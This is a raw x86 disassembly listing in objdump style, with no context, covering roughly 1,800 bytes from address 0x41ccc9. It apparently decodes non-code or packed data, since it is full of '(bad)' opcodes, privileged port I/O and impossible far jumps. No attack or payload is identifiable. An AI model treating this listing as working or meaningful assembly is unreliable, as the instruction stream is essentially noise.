  41ccc9:	aaa    
  41ccca:	pop    ds
  41cccb:	scas   al,BYTE PTR es:[edi]
  41cccc:	mov    eax,0xa888e806
  41ccd1:	adc    bh,BYTE PTR [ebx]
  41ccd3:	test   DWORD PTR [ecx+0x35],0xd05fabdf
  41ccda:	out    0x3,al
  41ccdc:	cld    
  41ccdd:	stos   BYTE PTR es:[edi],al
  41ccde:	arpl   WORD PTR [esi-0x126a145a],si
  41cce4:	in     eax,dx
  41cce5:	inc    esp
  41cce6:	fbstp  TBYTE PTR [esi+0x418efaa7]
  41ccec:	adc    ebp,DWORD PTR [esi-0x51784983]
  41ccf2:	popa   
  41ccf3:	cmp    eax,0xbf4ad71
  41ccf8:	repnz inc edi
  41ccfa:	out    dx,eax
  41ccfb:	dec    esi
  41ccfc:	inc    BYTE PTR [edi-0x11]
  41ccff:	stos   DWORD PTR es:[edi],eax
  41cd00:	loopne 0x41ccad
  41cd02:	push   ebp
  41cd03:	mov    dh,0x0
  41cd05:	add    BYTE PTR [eax],al
  41cd07:	add    BYTE PTR [eax],al
  41cd09:	dec    ecx
  41cd0a:	jns    0x41cd3a
  41cd0c:	stos   DWORD PTR es:[edi],eax
  41cd0d:	outs   dx,DWORD PTR ds:[esi]
  41cd0e:	shl    dh,1
  41cd10:	add    esi,esp
  41cd12:	test   eax,0x997f30e7
  41cd17:	or     BYTE PTR [ebx+0x3deffa38],cl
  41cd1d:	imul   esi,DWORD PTR [esi],0xae27b6f7
  41cd23:	push   cs
  41cd24:	lods   eax,DWORD PTR ds:[esi]
  41cd25:	mov    ebx,0xe2f2e702
  41cd2a:	dec    ebp
  41cd2b:	mov    dl,0xcc
  41cd2d:	mov    ah,0x6
  41cd2f:	out    0xb6,eax
  41cd31:	dec    eax
  41cd32:	lods   eax,DWORD PTR ds:[esi]
  41cd33:	jae    0x41cd40
  41cd35:	popf   
  41cd36:	scas   al,BYTE PTR es:[edi]
  41cd37:	push   ebx
  41cd39:	enter  0x88ae,0x9f
  41cd3d:	jb     0x41cdba
  41cd3f:	inc    edx
  41cd40:	in     eax,0x33
  41cd42:	add    DWORD PTR [eax],ecx
  41cd44:	jmp    0xaf4e0c46
  41cd49:	mov    ch,0xfa
  41cd4b:	(bad)  
  41cd4c:	call   0x1e97965e
  41cd51:	or     BYTE PTR [ecx],dh
  41cd53:	and    al,0xd5
  41cd55:	inc    ebp
  41cd56:	scas   al,BYTE PTR es:[edi]
  41cd57:	cld    
  41cd58:	cmp    eax,0x35fd1155
  41cd5d:	push   ebp
  41cd5e:	adc    eax,ebp
  41cd60:	retf   0xade9
  41cd63:	cld    
  41cd64:	jb     0x41cd47
  41cd66:	jg     0x41cd5d
  41cd68:	sbb    eax,0xc573af81
  41cd6d:	add    BYTE PTR [eax],al
  41cd6f:	add    BYTE PTR [eax],al
  41cd71:	add    BYTE PTR [edx-0x66],dh
  41cd74:	cmp    al,0x86
  41cd76:	enter  0x88ad,0x81
  41cd7a:	mov    ch,BYTE PTR [esi-0x357c1f8d]
  41cd80:	jae    0x41cd66
  41cd82:	in     eax,dx
  41cd83:	inc    esi
  41cd84:	or     al,0x70
  41cd86:	je     0x41ce03
  41cd88:	les    edi,FWORD PTR [esi-0x16f43fc0]
  41cd8e:	xor    edi,DWORD PTR [ebx-0x15]
  41cd91:	push   0xe8fef90d
  41cd96:	jbe    0x41cd4c
  41cd98:	inc    edx
  41cd99:	in     eax,dx
  41cd9a:	ja     0x41cdef
  41cd9c:	push   esi
  41cd9d:	sahf   
  41cd9e:	in     eax,dx
  41cd9f:	daa    
  41cda0:	or     dh,bl
  41cda2:	cmp    bh,BYTE PTR [eax-0x1]
  41cda5:	call   0x7301c120
  41cdaa:	mov    al,0xa4
  41cdac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdad:	pop    ss
  41cdae:	call   0x1a5b5660
  41cdb3:	mov    bh,0x73
  41cdb5:	add    dl,bh
  41cdb7:	sub    ebp,edi
  41cdb9:	call   FWORD PTR [eax+esi*8-0x2373c182]
  41cdc0:	popa   
  41cdc1:	mov    edx,edx
  41cdc3:	lods   al,BYTE PTR ds:[esi]
  41cdc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdc5:	add    BYTE PTR [esp+eax*1+0x0],bl
  41cdc9:	jne    0x41cd7f
  41cdcb:	retf   
  41cdcc:	sti    
  41cdcd:	(bad)  
  41cdce:	cmp    al,0x77
  41cdd0:	test   DWORD PTR [esi+0x50],eax
  41cdd3:	mov    ds:0x89bf,eax
  41cdd8:	add    BYTE PTR [eax],al
  41cdda:	add    BYTE PTR [ecx+0x27c686fa],ah
  41cde0:	adc    al,0x87
  41cde2:	or     BYTE PTR [edi+0x6],al
  41cde5:	jno    0x41cdfd
  41cde7:	xlat   BYTE PTR ds:[ebx]
  41cde8:	aaa    
  41cde9:	add    al,0x23
  41cdeb:	out    0xaa,eax
  41cded:	dec    ecx
  41cdee:	or     al,0x81
  41cdf0:	cli    
  41cdf1:	repnz inc eax
  41cdf3:	adc    BYTE PTR [eax],al
  41cdf5:	add    BYTE PTR [esi],cl
  41cdf7:	or     al,0xdd
  41cdf9:	jae    0xcfc8ce3b
  41cdff:	in     al,0x47
  41ce01:	(bad)  
  41ce02:	dec    DWORD PTR [ebx-0x1a8a42d4]
  41ce08:	pop    edx
  41ce09:	sbb    eax,0x87068283
  41ce0e:	dec    eax
  41ce0f:	rcr    BYTE PTR [esi-0x43],1
  41ce12:	add    ah,cl
  41ce14:	idiv   edi
  41ce16:	jae    0x41cde9
  41ce18:	sbb    BYTE PTR [eax+eax*1],0x27
  41ce1c:	add    eax,0x768be17d
  41ce21:	in     al,dx
  41ce22:	call   DWORD PTR [ebp+0x37]
  41ce25:	add    al,0xeb
  41ce27:	iret   
  41ce28:	and    BYTE PTR [edx],0x0
  41ce2b:	daa    
  41ce2c:	ins    DWORD PTR es:[edi],dx
  41ce2d:	xchg   edi,ecx
  41ce2f:	test   BYTE PTR [edi+0x1475fffa],dl
  41ce35:	mov    bh,ch
  41ce37:	lock adc ebp,DWORD PTR [esi]
  41ce3a:	test   DWORD PTR [edi],ebx
  41ce3c:	ins    DWORD PTR es:[edi],dx
  41ce3d:	or     BYTE PTR es:[eax],al
  41ce40:	add    BYTE PTR [eax],al
  41ce42:	add    BYTE PTR [eax],al
  41ce44:	mov    dh,BYTE PTR [esi-0x28]
  41ce47:	aad    0x36
  41ce49:	cdq    
  41ce4a:	mov    bl,0x12
  41ce4c:	push   ecx
  41ce4d:	retf   0x40
  41ce50:	inc    al
  41ce52:	jp     0x41ceae
  41ce54:	jns    0x41ce7c
  41ce56:	les    ecx,FWORD PTR [ecx+edi*8]
  41ce59:	stos   BYTE PTR es:[edi],al
  41ce5a:	add    eax,DWORD PTR [eax]
  41ce5c:	jne    0x41ceac
  41ce5e:	xor    al,0x14
  41ce60:	cmp    bl,BYTE PTR [ebx-0x66b50010]
  41ce66:	jge    0x41ce74
  41ce68:	out    dx,al
  41ce69:	loope  0x41ce76
  41ce6b:	xchg   DWORD PTR [ebp-0x1f3822f],ebp
  41ce71:	icebp  
  41ce72:	ja     0xc0377c35
  41ce78:	out    dx,al
  41ce79:	arpl   WORD PTR [edx+eiz*2+0x7400bbf6],bx
  41ce80:	scas   al,BYTE PTR es:[edi]
  41ce81:	xor    BYTE PTR [ecx+0x8],cl
  41ce84:	(bad)  
  41ce85:	call   0x8ab8:0x9865bf85
  41ce8c:	or     ch,0x7b
  41ce8f:	inc    edx
  41ce90:	icebp  
  41ce91:	push   eax
  41ce92:	int3   
  41ce93:	int3   
  41ce94:	jne    0x41ce2f
  41ce96:	jge    0x41cef2
  41ce98:	jno    0x41ceb7
  41ce9a:	les    ecx,FWORD PTR [ecx+esi*8]
  41ce9d:	or     al,0x4
  41ce9f:	add    BYTE PTR [ebp+0x30],dh
  41cea2:	add    DWORD PTR [ebx+0x57dd546],ecx
  41cea8:	add    BYTE PTR [eax],al
  41ceaa:	add    BYTE PTR [eax],al
  41ceac:	add    BYTE PTR [esi-0x28],dh
  41ceaf:	jp     0x41ceb8
  41ceb1:	out    dx,al
  41ceb2:	mov    eax,DWORD PTR [edi+eax*4]
  41ceb5:	cmp    eax,0x397eeb02
  41ceba:	cli    
  41cebb:	outs   dx,DWORD PTR ds:[esi]
  41cebc:	cmp    al,0x6d
  41cebe:	ja     0x41ce65
  41cec0:	push   ebx
  41cec2:	cmp    ebx,ebx
  41cec4:	jle    0x41cf00
  41cec6:	cli    
  41cec7:	imul   edi,DWORD PTR [ebp-0x7f67effa],0x31
  41cece:	adc    bl,BYTE PTR [eax-0x68ee457a]
  41ced4:	mov    dl,0x87
  41ced6:	ss std 
  41ced8:	inc    ebx
  41ced9:	jne    0x41ce60
  41cedb:	mov    ds:0xd33fedff,al
  41cee0:	add    al,0x73
  41cee2:	jge    0x41ceff
  41cee4:	cld    
  41cee5:	std    
  41cee6:	ror    esi,0x2f
  41cee9:	dec    esi
  41ceea:	stos   BYTE PTR es:[edi],al
  41ceeb:	mov    ebp,0xb5804a7e
  41cef0:	cmp    ch,ah
  41cef2:	jge    0x41cf1d
  41cef4:	sbb    BYTE PTR [esi+0x2],ch
  41cef7:	out    0x63,eax
  41cef9:	sub    dh,BYTE PTR [ecx]
  41cefb:	push   ss
  41cefc:	xchg   edx,esp
  41cefe:	shl    BYTE PTR [esi],cl
  41cf00:	xor    DWORD PTR [ebp-0x727ec90e],0x12c3b9e2
  41cf0a:	and    al,0x7c
  41cf0c:	add    esi,DWORD PTR [ebp+0x7e]
  41cf0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf10:	aaa    
  41cf11:	add    BYTE PTR [eax],al
  41cf13:	add    BYTE PTR [eax],al
  41cf15:	add    BYTE PTR [edx-0x76e218e4],bl
  41cf1b:	push   ebp
  41cf1c:	dec    edi
  41cf1d:	xchg   ecx,eax
  41cf1e:	inc    edx
  41cf1f:	add    ah,bh
  41cf21:	xchg   BYTE PTR [edi+0x12],bl
  41cf24:	out    0x7e,eax
  41cf26:	pop    ebp
  41cf27:	push   cs
  41cf28:	ror    DWORD PTR [eax-0x48],cl
  41cf2b:	jg     0x41cf67
  41cf2d:	mov    cl,0xc9
  41cf2f:	test   eax,0x27503e2
  41cf34:	add    BYTE PTR [edi+eax*1+0x36],ch
  41cf38:	or     eax,0xf07acf62
  41cf3d:	je     0x41cf3c
  41cf3f:	mov    ch,0xfd
  41cf41:	push   ds
  41cf42:	out    0xa1,eax
  41cf44:	xchg   edx,eax
  41cf45:	mov    dh,0xe7
  41cf47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf48:	cld    
  41cf49:	xchg   esp,eax
  41cf4a:	and    WORD PTR [edx-0x3593a03],0xffe9
  41cf52:	cmc    
  41cf53:	test   bl,dh
  41cf55:	test   esp,0xc7bbe7a6
  41cf5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf5c:	cld    
  41cf5d:	ins    BYTE PTR es:[edi],dx
  41cf5e:	and    al,0x35
  41cf60:	or     eax,0xf07a3c72
  41cf65:	fs repnz mov ah,0xfd
  41cf69:	into   
  41cf6a:	add    al,0xa1
  41cf6c:	push   0x26
  41cf6e:	add    al,0xa6
  41cf70:	mov    BYTE PTR [ebx*2+0x2c621781],ah
  41cf77:	call   0x0:0x1a07
  41cf7e:	add    BYTE PTR [ecx],dl
  41cf80:	ins    BYTE PTR es:[edi],dx
  41cf81:	int3   
  41cf82:	jmp    0x3f01c2fd
  41cf87:	(bad)  
  41cf88:	dec    ebx
  41cf89:	(bad)  
  41cf8a:	stos   DWORD PTR es:[edi],eax
  41cf8b:	add    DWORD PTR [edx],0x9a7d0356
  41cf91:	mov    esi,DWORD PTR [esi-0x567cfd8f]
  41cf97:	cmp    eax,0x76c980ff
  41cf9c:	jnp    0x41cf8d
  41cf9e:	cmp    BYTE PTR [ebx-0xd],0xf5
  41cfa2:	ins    BYTE PTR es:[edi],dx
  41cfa3:	das    
  41cfa4:	xor    eax,0x1aead336
  41cfa9:	or     BYTE PTR [esi-0x1e],dl
  41cfac:	rcl    ch,1
  41cfae:	stos   BYTE PTR es:[edi],al
  41cfaf:	jbe    0x41cf58
  41cfb1:	adc    al,BYTE PTR [eax]
  41cfb3:	js     0x41cfca
  41cfb5:	inc    eax
  41cfb6:	add    BYTE PTR [ebp-0x4],al
  41cfb9:	add    al,0xf8
  41cfbc:	adc    BYTE PTR [edi-0x3c5987b4],al
  41cfc2:	inc    eax
  41cfc3:	test   al,0xb4
  41cfc5:	cld    
  41cfc6:	dec    DWORD PTR [ebp+eiz*1-0x72b76fd]
  41cfcd:	xchg   dh,al
  41cfcf:	ja     0x41cfd5
  41cfd1:	push   eax
  41cfd2:	call   0x3e91be
  41cfd7:	jmp    0x2f04:0x8ccf618c
  41cfde:	rol    BYTE PTR [edx],0xbe
  41cfe1:	add    BYTE PTR [eax],al
  41cfe3:	add    BYTE PTR [eax],al
  41cfe5:	add    BYTE PTR [eax],al
  41cfe7:	add    BYTE PTR [ecx+0x3081e925],ch
  41cfed:	cld    
  41cfee:	cld    
  41cfef:	dec    DWORD PTR [edx+ecx*2-0x79]
  41cff3:	icebp  
  41cff4:	mov    esp,DWORD PTR ds:0x30a85f5
  41cffa:	test   dh,cl
  41cffc:	dec    esp
  41cffd:	add    al,0x0
  41cfff:	lea    ecx,[ebx-0x1c2fc632]
  41d005:	xchg   edx,eax
  41d006:	cld    
  41d007:	push   cs
  41d008:	fwait
  41d009:	ret    
  41d00a:	cld    
  41d00b:	dec    DWORD PTR [edi+eiz*1]
  41d00e:	inc    edx
  41d00f:	or     al,0x8f
  41d011:	arpl   bp,di
  41d013:	mov    BYTE PTR [ecx+0x2],bl
  41d016:	jno    0x41d029
  41d018:	imul   ecx,DWORD PTR [eax+ebp*8-0x6a],0xffffffd3
  41d01d:	add    eax,DWORD PTR [eax]
  41d01f:	mov    edi,DWORD PTR [eax+eax*4-0xe]
  41d023:	addps  xmm3,XMMWORD PTR [edi]
  41d026:	std    
  41d027:	(bad)  
  41d028:	fdivr  QWORD PTR [esi+0x79]
  41d02b:	or     ah,cl
  41d02d:	out    dx,eax
  41d02e:	inc    eax
  41d02f:	push   DWORD PTR [ebp-0x3a]
  41d032:	clc    
  41d033:	sbb    BYTE PTR [eax],0x42
  41d036:	scas   eax,DWORD PTR es:[edi]
  41d037:	cld    
  41d038:	retf   0x7d99
  41d03b:	or     ch,0xe7
  41d03e:	scas   eax,DWORD PTR es:[edi]
  41d03f:	cld    
  41d040:	int    0x87
  41d042:	dec    esi
  41d043:	std    
  41d044:	mov    dl,0x1e
  41d046:	mov    al,0x73
  41d048:	jp     0x41d07e
  41d04a:	fmul   DWORD PTR [eax+0x0]
  41d050:	add    BYTE PTR [ebx-0x641879ea],dh
  41d056:	adc    BYTE PTR [eax-0x50a70019],dh
  41d05c:	cld    
  41d05d:	mov    dl,0x16
  41d05f:	cdq    
  41d060:	std    
  41d061:	sub    BYTE PTR [eax-0x668afffb],0x85
  41d068:	cld    
  41d069:	jmp    0xff164c36
  41d06e:	outs   dx,BYTE PTR ds:[esi]
  41d06f:	jle    0x41cff3
  41d071:	dec    ebp
  41d072:	(bad)  
  41d073:	lods   al,BYTE PTR ds:[esi]
  41d074:	cld    
  41d075:	dec    ebp
  41d076:	ds dec ebp
  41d078:	std    
  41d079:	push   edx
  41d07a:	and    al,0x46
  41d07c:	adc    al,0x8e
  41d07e:	pop    eax
  41d07f:	ss inc esi
  41d081:	neg    BYTE PTR [eax-0x2d]
  41d084:	dec    edi
  41d085:	call   0x91c460
  41d08a:	(bad)  
  41d08b:	mov    bl,0x30
  41d08d:	xor    eax,0x75f8b091
  41d092:	cdq    
  41d093:	test   BYTE PTR [edi+0x1016c9a1],bh
  41d099:	add    bh,bl
  41d09b:	jecxz  0x41d0ec
  41d09d:	(bad)  
  41d09e:	push   edi
  41d09f:	push   ebx
  41d0a0:	std    
  41d0a1:	push   0x754015e1
  41d0a6:	sbb    al,0xc8
  41d0a8:	or     edi,eax
  41d0aa:	pop    eax
  41d0ab:	sbb    bl,BYTE PTR ss:[edi+0x2]
  41d0af:	jmp    0x41d04c
  41d0b1:	imul   edi,DWORD PTR [eax+0x3e6],0x0
  41d0b8:	add    BYTE PTR [eax],al
  41d0ba:	test   cl,0xda
  41d0bd:	or     ah,dh
  41d0bf:	loope  0x41d0a7
  41d0c1:	call   0x2e02:0x8926f374
  41d0c8:	jecxz  0x41d146
  41d0ca:	mov    bl,BYTE PTR [ebx-0x9d07d1c]
  41d0d0:	out    0x38,al
  41d0d2:	jae    0x41d124
  41d0d4:	cvtpi2ps xmm6,QWORD PTR [ebx-0x250d18ff]
  41d0db:	inc    esi
  41d0dc:	mov    ch,0xbc
  41d0de:	mov    ah,0xf9
  41d0e0:	out    0x58,al
  41d0e2:	cld    
  41d0e3:	xchg   ebp,eax
  41d0e4:	xchg   edi,eax
  41d0e5:	push   edx
  41d0e6:	sub    esi,DWORD PTR [ebp-0x55]
  41d0e9:	scas   eax,DWORD PTR es:[edi]
  41d0ea:	sub    ebx,DWORD PTR [eax+ebp*8]
  41d0ed:	sbb    DWORD PTR [ebp-0x5b],esi
  41d0f0:	jae    0x41d0ed
  41d0f2:	repz aas 
  41d0f4:	jecxz  0x41d149
  41d0f6:	pusha  
  41d0f7:	adc    BYTE PTR [ebx],bl
  41d0f9:	adc    al,0xb5
  41d0fb:	add    ch,BYTE PTR [ebx+eax*8-0x39]
  41d0ff:	or     edi,DWORD PTR [edi]
  41d101:	cld    
  41d102:	je     0x41d106
  41d104:	out    0x56,eax
  41d106:	out    dx,al
  41d107:	aas    
  41d108:	out    dx,eax
  41d109:	push   ebx
  41d10a:	cmp    BYTE PTR [eax],dh
  41d10c:	jecxz  0x41d08e
  41d10e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d10f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d110:	mov    esi,0xe6a62acb
  41d115:	jp     0x41d161
  41d117:	call   0xaa69:0xa62d82e9
  41d11e:	add    BYTE PTR [eax],al
  41d120:	add    BYTE PTR [eax],al
  41d122:	add    BYTE PTR [ecx],dl
  41d124:	das    
  41d125:	pop    ss
  41d126:	mov    dh,0x35
  41d128:	add    al,0xfc
  41d12a:	sbb    dh,ah
  41d12c:	daa    
  41d12d:	out    dx,eax
  41d12e:	add    al,0x81
  41d130:	cld    
  41d131:	jmp    FWORD PTR [ecx-0x5b]
  41d134:	cli    
  41d135:	add    esp,esi
  41d137:	cmp    eax,DWORD PTR [ecx-0xc842328]
  41d13d:	mov    edi,0xe8fe59c7
  41d142:	mov    ecx,0xaa8a9aa9
  41d147:	sbb    esp,DWORD PTR [eax]
  41d149:	add    DWORD PTR ds:0xea73023a,0xa90f9b7f
  41d153:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d154:	add    edi,edi
  41d156:	call   0xda7d04d1
  41d15b:	loope  0x41d17c
  41d15d:	xchg   ebp,ebp
  41d15f:	xor    edi,DWORD PTR [ebx-0x29]
  41d162:	push   0xffffffde
  41d164:	add    esi,DWORD PTR [esi-0x43]
  41d167:	imul   DWORD PTR [eax]
  41d169:	or     bl,ch
  41d16b:	cmp    eax,0x171154dc
  41d170:	jo     0x41d171
  41d172:	call   0xf7c46766
  41d177:	mov    ds:0x77ed67f5,eax
  41d17c:	add    al,BYTE PTR [eax]
  41d17e:	ss ret 
  41d180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d181:	adc    cl,BYTE PTR [ecx]
  41d183:	inc    dx
  41d185:	add    BYTE PTR [eax+eax*1+0x0],ah
  41d189:	add    BYTE PTR [eax],al
  41d18b:	add    BYTE PTR [ecx],dh
  41d18d:	xor    BYTE PTR [ecx],al
  41d18f:	push   0xfffffffc
  41d191:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d192:	push   ebp
  41d193:	shl    DWORD PTR [ebx],1
  41d195:	mov    eax,0xc2ade8ff
  41d19a:	call   0xfcfec789
  41d19f:	inc    edi
  41d1a0:	lods   al,BYTE PTR ds:[esi]
  41d1a1:	mov    ebp,0x5176f1c1
  41d1a6:	mov    DWORD PTR [ebp+0x48135a6],eax
  41d1ac:	lds    esp,FWORD PTR [ebx+ecx*4+0x4d564900]
  41d1b3:	push   0xd
  41d1b5:	or     eax,DWORD PTR [eax]
  41d1b7:	push   ecx
  41d1b9:	test   al,0x85
  41d1bb:	inc    ebp
  41d1bc:	fs dec esi
  41d1be:	sti    
  41d1bf:	adc    eax,0x400e98
  41d1c4:	push   ecx
  41d1c5:	mov    esi,0xb121971
  41d1ca:	add    al,0x8d
  41d1cc:	adc    DWORD PTR [ebp+0x4c],edx
  41d1cf:	lea    edx,[ecx]
  41d1d1:	test   eax,0xa501ff4c
  41d1d6:	mov    DWORD PTR [ebp+0x64],esi
  41d1d9:	xchg   BYTE PTR [edi],dl
  41d1db:	add    BYTE PTR [eax+eax*1-0x7e7014a2],bl
  41d1e2:	(bad)  
  41d1e3:	dec    DWORD PTR [edi]
  41d1e5:	push   esi
  41d1e6:	add    BYTE PTR [ebp-0x5f],dh
  41d1e9:	xchg   edi,eax
  41d1ea:	inc    ecx
  41d1eb:	or     al,ah
  41d1ed:	cld    
  41d1ee:	jle    0x41d255
  41d1f0:	add    BYTE PTR [eax],al
  41d1f2:	add    BYTE PTR [eax],al
  41d1f4:	add    BYTE PTR [eax-0x2],bh
  41d1f7:	xchg   BYTE PTR [ebp+0x78],al
  41d1fa:	addr16 mov esi,0x874d5c08
  41d200:	in     al,dx
  41d201:	add    esp,DWORD PTR ds:0x559c1442
  41d207:	jno    0x41d219
  41d209:	iret   
  41d20a:	data16 sti 
  41d20c:	push   DWORD PTR [ecx+0x3b006a02]
  41d212:	in     eax,dx
  41d213:	pop    es
  41d214:	inc    DWORD PTR [edx+0x57]
  41d217:	adc    DWORD PTR [eax],edi
  41d219:	sbb    al,0x40
  41d21b:	add    bh,bh
  41d21d:	xor    bh,BYTE PTR [ebp-0x44]
  41d220:	movmskps edx,xmm3
  41d223:	adc    edi,edi
  41d225:	and    esp,esi
  41d227:	cmovo  ecx,DWORD PTR [ebx+ebp*1]
  41d22b:	les    ebx,FWORD PTR [edi+0x75]
  41d22e:	out    dx,al
  41d22f:	ror    DWORD PTR [edi],0x75
  41d232:	out    dx,al
  41d233:	jbe    0x41d220
  41d235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d236:	or     bh,ch
  41d238:	fsub   DWORD PTR [esi+0x44fc3e16]
  41d23e:	or     BYTE PTR [edx],bl
  41d240:	add    al,BYTE PTR [esi+0x8]
  41d243:	dec    edi
  41d244:	std    
  41d245:	push   0xdafe68b1
  41d24a:	cdq    
  41d24b:	or     BYTE PTR [edi-0x4],0x56
  41d24f:	lods   al,BYTE PTR ds:[esi]
  41d250:	cld    
  41d251:	pusha  
  41d252:	mov    cl,0x10
  41d254:	inc    eax
  41d255:	jne    0x41d26d
  41d257:	shl    DWORD PTR [edx+0x0],0x0
  41d25b:	add    BYTE PTR [eax],al
  41d25d:	add    BYTE PTR [eax-0x4de7ca1c],dl
  41d263:	data16 adc al,0xfd
  41d266:	and    cl,cl
  41d268:	dec    edi
  41d269:	std    
  41d26a:	sub    BYTE PTR [ebp+0x49972ab],ch
  41d270:	push   ss
  41d271:	inc    eax
  41d272:	gs pop ecx
  41d274:	add    BYTE PTR [ebx-0x4f01714b],al
  41d27a:	je     0x41d278
  41d27c:	xor    eax,0xcce7afc
  41d281:	adc    BYTE PTR [ebp-0x313f8967],dh
  41d287:	loop   0x41d247
  41d289:	adc    esi,DWORD PTR [ebp-0x1a]
  41d28c:	jl     0x41d279
  41d28e:	div    BYTE PTR [edi+esi*8-0x572e3f80]
  41d295:	push   eax
  41d296:	mov    ds:0x6537ef20,eax
  41d29b:	fld    DWORD PTR [ebx]
  41d29d:	mov    esi,DWORD PTR [eax+0x4e315365]
  41d2a3:	or     BYTE PTR [ecx+0x47227972],ch
  41d2a9:	cld    
  41d2aa:	mov    BYTE PTR [edx],0xa6
  41d2ad:	xor    DWORD PTR [ebp-0x5d],ebp
  41d2b0:	aad    0xaa
  41d2b2:	sub    BYTE PTR [ebp-0x5a],bh
  41d2b5:	xor    DWORD PTR [edi+esi*2-0x40c257dd],edi
  41d2bc:	sti    
  41d2bd:	add    dl,dh
  41d2bf:	inc    esp
  41d2c0:	jg     0x41d261
  41d2c2:	add    BYTE PTR [eax],al
  41d2c4:	add    BYTE PTR [eax],al
  41d2c6:	add    BYTE PTR [ecx-0x53ff5981],dh
  41d2cc:	mov    edi,0x18daebf2
  41d2d1:	xor    eax,DWORD PTR [esi*2-0x72505c87]
  41d2d8:	mov    edi,0x34ffd7da
  41d2dd:	dec    ebx
  41d2de:	push   ebp
  41d2df:	and    eax,0x25f7bba3
  41d2e4:	mov    ds:0xeab1fbb3,eax
  41d2e9:	xor    eax,0xb3c1f7d2
  41d2ee:	adc    ebp,esp
  41d2f0:	cmp    al,0xf7
  41d2f2:	jle    0x41d323
  41d2f4:	scas   al,BYTE PTR es:[edi]
  41d2f5:	outs   dx,DWORD PTR ds:[esi]
  41d2f6:	cld    
  41d2f7:	std    
  41d2f8:	cmp    al,0x13
  41d2fa:	jge    0x41d333
  41d2fc:	stos   BYTE PTR es:[edi],al
  41d2fd:	add    esp,edi
  41d2ff:	sub    DWORD PTR [ebx+edi*8],0xe6b6139b
  41d306:	add    esi,DWORD PTR [eax-0x26]
  41d309:	cmc    
  41d30a:	adc    BYTE PTR [ecx-0x13fc590e],cl
  41d310:	inc    edi
  41d311:	fisttp WORD PTR [ecx-0x44]
  41d314:	retf   
  41d315:	test   al,0xf7
  41d317:	push   edx
  41d318:	xor    eax,0x32bac41a
  41d31d:	aaa    
  41d31e:	push   esp
  41d31f:	inc    eax
  41d320:	pop    ss
  41d321:	or     ecx,DWORD PTR [eax+edi*1]
  41d324:	fnstcw WORD PTR [ebp-0xd92f0]
  41d32a:	sub    BYTE PTR [eax],al
  41d32c:	add    BYTE PTR [eax],al
  41d32e:	add    BYTE PTR [eax],al
  41d330:	jno    0x41d2d1
  41d332:	xor    eax,0xd8972e62
  41d337:	add    ebp,DWORD PTR [edx]
  41d339:	mov    al,ds:0xfe659ec0
  41d33e:	movaps XMMWORD PTR [ecx-0x74],xmm6
  41d342:	shl    BYTE PTR [edx],0x3b
  41d345:	push   es
  41d346:	add    BYTE PTR [edx+edi*2],bl
  41d349:	lods   eax,DWORD PTR ds:[esi]
  41d34a:	jle    0x41d2d9
  41d34c:	dec    esi
  41d34d:	mov    eax,ds:0x1cf3e9fc
  41d352:	or     al,0x6e
  41d354:	fild   WORD PTR [ebp+0x276e99a]
  41d35a:	mul    BYTE PTR [edx+eax*4+0x12ac8b04]
  41d361:	push   edx
  41d362:	mov    esp,DWORD PTR [esi+ebp*1-0x61]
  41d366:	cld    
  41d367:	inc    esi
  41d368:	es lahf 
  41d36a:	jb     0x41d359
  41d36c:	mov    bh,0x44
  41d36e:	cld    
  41d36f:	imul   esi,DWORD PTR [esi+0x2],0x9f88b500
  41d376:	adc    dl,BYTE PTR ds:0x64004285
  41d37c:	mov    dh,0x15
  41d37e:	adc    BYTE PTR [edx-0x32],ch
  41d381:	sahf   
  41d382:	out    0x3b,al
  41d384:	jbe    0x41d388
  41d386:	add    BYTE PTR [esi],al
  41d388:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41d38a:	adc    ch,BYTE PTR [ecx-0x7014548a]
  41d390:	repz pop ebx
  41d392:	push   edi
  41d393:	out    dx,al
  41d394:	add    BYTE PTR [eax],al
  41d396:	add    BYTE PTR [eax],al
  41d398:	add    BYTE PTR [esi+ebx*4],cl
  41d39b:	add    DWORD PTR [ebx+edi*1+0x2b],ebx
  41d39f:	add    al,0x6c
  41d3a1:	sar    BYTE PTR ds:0x511cd6fd,cl
  41d3a7:	mov    esp,DWORD PTR [ecx+ebx*1]
  41d3aa:	push   ecx
  41d3ab:	mov    BYTE PTR [eax],0x89
  41d3ae:	fwait
  41d3af:	std    
  41d3b0:	out    0x1f,eax
  41d3b2:	pop    ecx
  41d3b3:	cld    
  41d3b4:	push   DWORD PTR [esi-0x797a76f8]
  41d3ba:	imul   edi,ebx,0xffffffff
  41d3bd:	pop    esp
  41d3be:	sbb    DWORD PTR [edx-0x1c],eax
  41d3c1:	dec    esp
  41d3c2:	jle    0x41d3b1
  41d3c4:	retf   
  41d3c5:	sbb    al,0x5
  41d3c7:	out    0x56,eax
  41d3c9:	jp     0x41d352
  41d3cb:	mov    ecx,0xfb6af358
  41d3d0:	pop    ss
  41d3d1:	jmp    0x51523aec
  41d3d6:	and    DWORD PTR [ebp-0x1],ebx
  41d3d9:	push   ebx
  41d3da:	imul   ecx,DWORD PTR [ebp+ecx*4+0x9],0x65
  41d3df:	dec    esp
  41d3e0:	(bad)  
  41d3e1:	sbb    DWORD PTR [edx+0x5f93e800],ebx
  41d3e7:	cld    
  41d3e8:	push   DWORD PTR [esi+0x16858906]
  41d3ee:	push   0xfffffffb
  41d3f0:	dec    DWORD PTR [eax+ebx*1]
  41d3f3:	inc    edx
  41d3f4:	lock or al,0x7d
  41d3f7:	mov    ecx,0xe7048ccb
  41d3fc:	adc    eax,0x0
  41d401:	add    BYTE PTR [esi],al
  41d403:	or     DWORD PTR [ecx-0x17c983bb],ecx
  41d409:	imul   edx,DWORD PTR [eax+0x6],0x10d9f600
  41d410:	std    
  41d411:	jae    0x41d394
  41d413:	ret    0xf41
  41d416:	pop    eax
  41d417:	ret    
  41d418:	inc    ecx
  41d419:	cld    
  41d41a:	dec    esi
